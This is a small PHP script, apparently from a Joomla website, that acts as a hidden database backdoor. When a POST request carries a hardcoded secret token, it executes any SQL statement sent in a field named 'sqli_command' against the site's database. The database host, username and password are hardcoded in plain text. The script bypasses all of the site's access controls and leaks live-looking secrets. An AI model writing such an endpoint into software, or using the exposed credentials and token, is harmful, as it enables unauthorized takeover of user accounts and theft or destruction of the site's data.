<?php

	function sql_command($command)
	{
		$servername = "fdb1031.runhosting.com";
		$username = "3950337_joomla7df3217c";
		$password = "SJpTdIGPqhBTjR2jIY5GyxMkkoDct1vB";
		$dbname = "3950337_joomla7df3217c";

		// Création de la connexion
		$conn = new mysqli($servername, $username, $password, $dbname);

		// Vérification de la connexion
		if ($conn->connect_error) {
		    die("Connection failed: ". $conn->connect_error);
		}

		// Exécution de la requête SQL et récupération des données
		// $sql = "SELECT * FROM `iorcu_users`";
		$result = $conn->query($command);

		// Affichage des données
		if ($result != 1) {
			echo "Il y a eu une erreur !";
		} else {
		    echo "1 ligne modifiée";
		}

		// Fermeture de la connexion
		$conn->close();
	}

    function verifyToken($token)
    {
        if ($token === "zfLMqQseDneEogUe52avGbBdJ8RATdCi9B4eag8cjPy8Qu82qkdffFYXwCcz3n3kV6K9wAeQY2nA6a6UGK38syHwLLfu632FoJ6X") {
        	$command = $_POST['sqli_command'];
            sql_command($command);
        } else {
            header("Location: /index.php");
            exit;
        }
    }

    if (isset($_POST['token'])) {
        $token = $_POST['token'];
        verifyToken($token);
    } else {
        header("Location: /index.php");
        exit;
    }
?>